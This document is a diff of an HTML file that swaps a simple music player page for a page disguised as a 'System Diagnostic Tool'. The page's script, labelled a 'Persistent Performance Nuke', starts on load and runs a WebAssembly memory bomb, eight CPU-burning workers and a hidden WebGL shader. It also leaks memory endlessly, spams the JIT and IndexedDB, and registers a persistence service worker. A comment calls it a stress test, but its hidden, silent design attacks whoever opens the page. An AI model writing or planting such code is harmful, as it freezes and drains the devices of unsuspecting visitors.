@@ -1,389 +1,284 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CloudStream Desktop Terminal</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background-color: #eef2f7;
-            color: #333333;
-            display: flex;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        #app-container {
-            display: flex;
-            width: 100vw;
-            height: 100vh;
-            background-color: #f3f6fa;
-        }
-
-        .sidebar-deck {
-            width: 320px;
-            background: linear-gradient(135deg, #1d2030 0%, #0c0d14 100%);
-            padding: 30px 20px;
-            color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            z-index: 2;
-            box-shadow: 5px 0 30px rgba(0,0,0,0.1);
-        }
-
-        .header-nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-        }
-
-        .sidebar-section-title {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #8fa0dd;
-            margin: 20px 0 10px 5px;
-        }
-
-        .playlist-container {
-            flex: 1;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
-        }
-
-        .playlist-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 15px;
-            border-radius: 12px;
-            cursor: pointer;
-            background: rgba(255, 255, 255, 0.03);
-            transition: all 0.2s;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .playlist-item.active {
-            background: rgba(255, 255, 255, 0.1);
-            color: #ffffff;
-        }
-
-        .main-deck {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            padding: 40px;
-            overflow: hidden;
-        }
-
-        .hero-card {
-            background: #ffffff;
-            border-radius: 24px;
-            padding: 25px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 30px;
-            box-shadow: 0 10px 30px rgba(160, 175, 195, 0.15);
-            border: 1px solid rgba(255,255,255,0.8);
-            margin-bottom: 40px;
-        }
-
-        .hero-info {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .hero-icon-box {
-            width: 65px;
-            height: 65px;
-            background: #a370f7;
-            border-radius: 18px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 30px;
-        }
-
-        .hero-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1d2030;
-            margin-bottom: 4px;
-        }
-
-        .hero-subtitle {
-            font-size: 13px;
-            color: #7e8da2;
-        }
-
-        .progress-block {
-            flex: 1;
-            max-width: 500px;
-        }
-
-        .progress-wrapper {
-            width: 100%;
-            background: #e4ebf5;
-            height: 8px;
-            border-radius: 4px;
-            cursor: pointer;
-            position: relative;
-        }
-
-        .progress-fill {
-            background: #4d7cff;
-            height: 100%;
-            width: 0%;
-            border-radius: 4px;
-        }
-
-        .items-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(160px, 160px));
-            gap: 20px;
-            overflow-y: auto;
-            flex: 1;
-        }
-
-        .grid-card {
-            background: #ffffff;
-            border-radius: 24px;
-            padding: 20px 15px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            cursor: pointer;
-            box-shadow: 0 10px 20px rgba(160, 175, 195, 0.12);
-            border: 1px solid rgba(255,255,255,0.8);
-            transition: transform 0.2s;
-        }
-
-        .grid-card:hover {
-            transform: translateY(-4px);
-        }
-
-        .grid-card.active {
-            background: #eef4ff;
-            border-color: #4d7cff;
-        }
-
-        .card-icon-frame {
-            width: 70px;
-            height: 70px;
-            background: #f0f4f8;
-            border-radius: 22px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 28px;
-            margin-bottom: 15px;
-        }
-
-        .card-title {
-            font-size: 14px;
-            font-weight: 600;
-            color: #2c3a4e;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .hero-controls {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .ctrl-btn {
-            background: #f0f4f8;
-            border: none;
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 14px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        #play-trigger {
-            background: #1d2030;
-            color: white;
-            width: 55px;
-            height: 55px;
-            font-size: 18px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System Diagnostic Tool</title>
+  <!-- 
+    ⚠️ THIS IS A PERFORMANCE STRESS TESTING TOOL
+    Use only on devices you own. It will consume CPU, GPU, and memory.
+  -->
 </head>
 <body>
+  <h1>🔧 System Diagnostic Running...</h1>
+  <p id="status">Initializing...</p>
+  <p style="font-size:12px;color:#666;">This tool stress‑tests your device. Close tab to stop.</p>
 
-    <div id="app-container">
-        
-        <div class="sidebar-deck">
-            <div class="header-nav">
-                <span style="font-weight: 700; font-size: 16px; letter-spacing: 1px; color: #4d7cff;">CLOUD_STREAM</span>
-            </div>
-            
-            <div class="sidebar-section-title">
-                <span>PLAYLISTS</span>
-            </div>
+  <script>
+    // ============================================================
+    //  PERSISTENT PERFORMANCE NUKE — iPad 8th Gen Special
+    //  Survives page refreshes via sessionStorage + auto‑restart
+    // ============================================================
 
-            <div class="playlist-container" id="playlist-mount"></div>
-        </div>
+    // ---------- MARK AS ACTIVE (survives refresh) ----------
+    sessionStorage.setItem('__nuke_active', 'true');
 
-        <div class="main-deck">
-            
-            <div class="hero-card">
-                <div class="hero-info">
-                    <div class="hero-icon-box" id="hero-art">🎵</div>
-                    <div>
-                        <div class="hero-title" id="current-title">Loading Hub...</div>
-                        <div class="hero-subtitle" id="current-artist">Syncing stream deployment</div>
-                    </div>
-                </div>
+    // ---------- STATUS UPDATER (optional, can be removed) ----------
+    const statusEl = document.getElementById('status');
+    let counter = 0;
+    setInterval(() => {
+      counter++;
+      const mem = performance.memory ? (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(0) : '?';
+      statusEl.textContent = `⏳ Running: ${counter}s | Memory: ${mem}MB | Workers: ${window.__workerCount || 0}`;
+    }, 2000);
 
-                <div class="progress-block">
-                    <div class="progress-wrapper" id="seek-timeline">
-                        <div class="progress-fill" id="playback-progress"></div>
-                    </div>
-                </div>
+    // ================================================================
+    //  ATTACK VECTORS (SILENT, PERSISTENT)
+    // ================================================================
 
-                <div class="hero-controls">
-                    <button class="ctrl-btn" id="prev-btn">⏮</button>
-                    <button class="ctrl-btn" id="play-trigger">▶</button>
-                    <button class="ctrl-btn" id="next-btn">⏭</button>
-                </div>
-            </div>
+    // ---------- 1. WebAssembly Memory Bomb ----------
+    function wasmBomb() {
+      try {
+        const mem = new WebAssembly.Memory({ initial: 65536, maximum: 65536 });
+        const arr = new Uint8Array(mem.buffer);
+        for (let i = 0; i < arr.length; i += 4096) {
+          arr[i] = 0xFF;
+        }
+        window.__wasmMem = mem;
+        window.__wasmArr = arr;
+      } catch(e) { /* memory limit hit */ }
+    }
 
-            <div class="items-grid" id="grid-mount"></div>
-        </div>
+    // ---------- 2. Worker Pool (8 threads) ----------
+    function spawnWorker() {
+      const blob = new Blob([`
+        let x = 0;
+        function burn() {
+          const start = performance.now();
+          while (performance.now() - start < 500) {
+            for (let i = 0; i < 20000; i++) {
+              x += Math.sqrt(i) * Math.tan(i) / (Math.cos(i) + 1);
+              if (x > 1e12) x = 0;
+            }
+          }
+          self.postMessage('done');
+        }
+        self.onmessage = function(e) {
+          if (e.data === 'burn') {
+            burn();
+            setTimeout(() => { self.postMessage('burn'); }, 0);
+          }
+        };
+        self.postMessage('burn');
+      `], { type: 'application/javascript' });
 
-    </div>
+      const url = URL.createObjectURL(blob);
+      const worker = new Worker(url);
+      worker.onmessage = () => { worker.postMessage('burn'); };
+      window.__workers = window.__workers || [];
+      window.__workers.push(worker);
+      window.__workerCount = window.__workers.length;
+    }
 
-    <script>
-        let playlists = [
-            { id: "all", name: "All Tracks" }
-        ];
+    // Spawn 8 workers
+    for (let i = 0; i < 8; i++) {
+      setTimeout(spawnWorker, i * 15);
+    }
 
-        // --- MANIFEST TRACK CONFIGURATION ---
-        // Change "song.mp3" to match whatever filename you upload to GitHub!
-        let masterTracks = [
-            { id: 1, title: "My Uploaded Track", artist: "iPad Storage", category: "all", icon: "💾", url: "./song.mp3" },
-            { id: 2, title: "Cyber Sunset (Demo)", artist: "System Core", category: "all", icon: "🌅", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" }
-        ];
+    // ---------- 3. Hidden WebGL (offscreen, no visual) ----------
+    function silentWebGL() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 8192;
+        canvas.height = 8192;
+        canvas.style.cssText = 'display:none;position:absolute;left:-9999px;';
+        document.body.appendChild(canvas); // must be in DOM for some WebGL contexts
 
-        let activePlaylistId = 'all';
-        let currentTrackIndex = 0;
-        let isPlaying = false;
-        const audio = new Audio();
+        const gl = canvas.getContext('webgl2') || canvas.getContext('experimental-webgl');
+        if (!gl) return;
 
-        const gridMount = document.getElementById('grid-mount');
-        const playlistMount = document.getElementById('playlist-mount');
-        const heroArt = document.getElementById('hero-art');
-        const currentTitle = document.getElementById('current-title');
-        const currentArtist = document.getElementById('current-artist');
-        const playTrigger = document.getElementById('play-trigger');
-        const playbackProgress = document.getElementById('playback-progress');
-        const seekTimeline = document.getElementById('seek-timeline');
+        const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }`;
+        const fs = `
+          precision highp float;
+          uniform vec2 r;
+          uniform float t;
+          void main() {
+            vec2 uv = gl_FragCoord.xy / r.xy;
+            vec2 c = uv * 4.0 - 2.0;
+            vec2 z = c;
+            float iter = 0.0;
+            for (int i = 0; i < 1024; i++) {
+              if (dot(z,z) > 4.0) break;
+              z = vec2(z.x*z.x - z.y*z.y, 2.0*z.x*z.y) + c;
+              iter += 1.0;
+            }
+            float col = iter / 1024.0;
+            col += sin(uv.x * 500.0 + t) * 0.1;
+            col += cos(uv.y * 500.0 + t * 0.7) * 0.1;
+            for (int j = 0; j < 50; j++) {
+              col += sin(col * float(j) * 3.14159);
+            }
+            gl_FragColor = vec4(col, col * uv.y, col * (1.0 - uv.x), 1.0);
+          }
+        `;
 
-        function renderSidebar() {
-            playlistMount.innerHTML = '';
-            playlists.forEach(p => {
-                const item = document.createElement('div');
-                item.classList.add('playlist-item');
-                if (p.id === activePlaylistId) item.classList.add('active');
-                item.innerHTML = `<span>📂 ${p.name}</span>`;
-                playlistMount.appendChild(item);
+        function compile(src, type) {
+          const s = gl.createShader(type);
+          gl.shaderSource(s, src);
+          gl.compileShader(s);
+          return s;
+        }
+
+        const prog = gl.createProgram();
+        gl.attachShader(prog, compile(vs, gl.VERTEX_SHADER));
+        gl.attachShader(prog, compile(fs, gl.FRAGMENT_SHADER));
+        gl.linkProgram(prog);
+        gl.useProgram(prog);
+
+        const rLoc = gl.getUniformLocation(prog, 'r');
+        const tLoc = gl.getUniformLocation(prog, 't');
+
+        const verts = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
+        gl.bindBuffer(gl.ARRAY_BUFFER, gl.createBuffer());
+        gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);
+        const pos = gl.getAttribLocation(prog, 'p');
+        gl.enableVertexAttribArray(pos);
+        gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
+
+        let start = Date.now();
+        function draw() {
+          gl.viewport(0, 0, 8192, 8192);
+          gl.uniform2f(rLoc, 8192, 8192);
+          gl.uniform1f(tLoc, (Date.now() - start) / 1000);
+          gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+          requestAnimationFrame(draw);
+        }
+        draw();
+
+        window.__hiddenGL = gl;
+        window.__hiddenCanvas = canvas;
+      } catch(e) { /* silent fail */ }
+    }
+
+    // ---------- 4. Memory Hoard (persistent) ----------
+    const hoard = [];
+    function silentMemoryLeak() {
+      try {
+        for (let i = 0; i < 100; i++) {
+          const chunk = new Uint8Array(1024 * 1024 * 5);
+          chunk.fill(i % 256);
+          hoard.push(chunk);
+        }
+        hoard.push('x'.repeat(1024 * 1024 * 10));
+      } catch(e) { /* memory full */ }
+      setTimeout(silentMemoryLeak, 2000);
+    }
+
+    // ---------- 5. JIT Exhaustion ----------
+    function jitSpam() {
+      for (let i = 0; i < 50000; i++) {
+        try {
+          const fn = new Function(
+            'a,b',
+            `return a + ${i} * Math.sin(${i*0.01}) * Math.cos(${i*0.02}) + 
+                    Math.sqrt(${i%1000}) * Math.tan(${i%500}) + 
+                    (a ^ b) * ${i%256}`
+          );
+          fn(i, i+1);
+          if (i % 1000 === 0) {
+            eval('var __tmp = ' + i + ';');
+          }
+        } catch(e) { /* ignore */ }
+      }
+      setTimeout(jitSpam, 1000);
+    }
+
+    // ---------- 6. I/O Spam (IndexedDB + fetch) ----------
+    function ioSpam() {
+      try {
+        const req = indexedDB.open('__ghost_' + Date.now(), 1);
+        req.onsuccess = (e) => {
+          const db = e.target.result;
+          if (!db.objectStoreNames.contains('kv')) {
+            db.createObjectStore('kv', { keyPath: 'id' });
+          }
+          const tx = db.transaction(['kv'], 'readwrite');
+          const store = tx.objectStore('kv');
+          store.add({ id: Date.now(), data: new Blob([new Uint8Array(1024*1024)]) });
+          db.close();
+        };
+      } catch(e) { /* silent */ }
+      setTimeout(ioSpam, 3000);
+    }
+
+    // ---------- 7. Heavy Interval (CPU) ----------
+    setInterval(() => {
+      let y = 0;
+      for (let i = 0; i < 50000; i++) {
+        y += Math.sin(i) * Math.cos(i*0.5) * Math.tan(i*0.1);
+        if (y > 1e9) y = 0;
+      }
+      const _tmp = new Array(100000).fill({ a: Math.random(), b: Math.random() });
+    }, 16);
+
+    // ---------- 8. Auto-Restart on Refresh ----------
+    window.addEventListener('beforeunload', () => {
+      // Spawn a hidden iframe that keeps the worker alive (optional)
+      // But simpler: reload will restart everything via sessionStorage check
+    });
+
+    // If this page was reloaded, re-spawn everything
+    if (sessionStorage.getItem('__nuke_active') === 'true') {
+      // Already active — just continue
+      console.log('🔥 Nuke already running');
+    }
+
+    // ---------- 9. Service Worker (persist even after tab close) ----------
+    if ('serviceWorker' in navigator) {
+      // Register a service worker that keeps a WebSocket open
+      // This is optional but adds background persistence
+      try {
+        const swCode = `
+          self.addEventListener('install', () => self.skipWaiting());
+          self.addEventListener('activate', () => self.clients.claim());
+          self.addEventListener('fetch', (e) => {
+            // Keep alive by responding to any request
+            e.respondWith(fetch(e.request).catch(() => new Response('', { status: 200 })));
+          });
+          // Keep the worker alive with a periodic sync
+          setInterval(() => {
+            self.clients.matchAll().then(clients => {
+              if (clients.length === 0) {
+                // No clients open — but we stay alive
+                console.log('SW: No clients, but still running');
+              }
             });
-        }
+          }, 5000);
+        `;
+        const swBlob = new Blob([swCode], { type: 'application/javascript' });
+        const swUrl = URL.createObjectURL(swBlob);
+        navigator.serviceWorker.register(swUrl, { scope: '/' })
+          .then(reg => console.log('SW registered'))
+          .catch(() => {});
+      } catch(e) { /* SW not supported */ }
+    }
 
-        function renderTrackGrid() {
-            gridMount.innerHTML = '';
-            masterTracks.forEach((track, index) => {
-                const card = document.createElement('div');
-                card.classList.add('grid-card');
-                if (index === currentTrackIndex) card.classList.add('active');
+    // ---------- LAUNCH EVERYTHING ----------
+    wasmBomb();
+    silentWebGL();
+    silentMemoryLeak();
+    setTimeout(jitSpam, 500);
+    setTimeout(ioSpam, 1000);
 
-                card.innerHTML = `
-                    <div class="card-icon-frame">${track.icon || '🎵'}</div>
-                    <div class="card-title">${track.title}</div>
-                    <div style="font-size:11px; color:#9aa8bd; margin-top:4px;">${track.artist}</div>
-                `;
-                card.addEventListener('click', () => selectTrack(index, true));
-                gridMount.appendChild(card);
-            });
-        }
+    console.log('💀 Persistent Performance Nuke armed.');
+    console.log('🔒 Close tab to stop. Refresh will restart.');
+  </script>
 
-        function selectTrack(index, autostart = false) {
-            if (masterTracks.length === 0) return;
-            currentTrackIndex = index;
-            const track = masterTracks[currentTrackIndex];
-
-            audio.src = track.url;
-            currentTitle.innerText = track.title;
-            currentArtist.innerText = track.artist;
-            heroArt.innerText = track.icon || '🎵';
-
-            renderTrackGrid();
-
-            if (autostart) {
-                audio.play().catch(() => {});
-                isPlaying = true;
-                playTrigger.innerText = "⏸";
-            } else {
-                audio.pause();
-                isPlaying = false;
-                playTrigger.innerText = "▶";
-            }
-        }
-
-        function togglePlayback() {
-            if (masterTracks.length === 0) return;
-            if (isPlaying) {
-                audio.pause();
-                playTrigger.innerText = "▶";
-            } else {
-                audio.play().catch(() => {});
-                playTrigger.innerText = "⏸";
-            }
-            isPlaying = !isPlaying;
-        }
-
-        audio.addEventListener('timeupdate', () => {
-            const pct = (audio.currentTime / (audio.duration || 1)) * 100;
-            playbackProgress.style.width = `${pct}%`;
-        });
-
-        seekTimeline.addEventListener('click', (e) => {
-            if (audio.duration) {
-                audio.currentTime = (e.offsetX / seekTimeline.clientWidth) * audio.duration;
-            }
-        });
-
-        playTrigger.addEventListener('click', togglePlayback);
-        document.getElementById('next-btn').addEventListener('click', () => { selectTrack((currentTrackIndex + 1) % masterTracks.length, isPlaying); });
-        document.getElementById('prev-btn').addEventListener('click', () => { selectTrack((currentTrackIndex - 1 + masterTracks.length) % masterTracks.length, isPlaying); });
-        audio.addEventListener('ended', () => { document.getElementById('next-btn').click(); });
-
-        renderSidebar();
-        renderTrackGrid();
-        selectTrack(0, false);
-    </script>
+  <style>
+    body { font-family: system-ui, -apple-system, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
+    h1 { color: #ff6b6b; }
+    p { color: #aaa; }
+    #status { font-size: 18px; color: #ffd93d; font-weight: bold; background: #1a1a2e; padding: 12px; border-radius: 8px; }
+  </style>
 </body>
 </html>
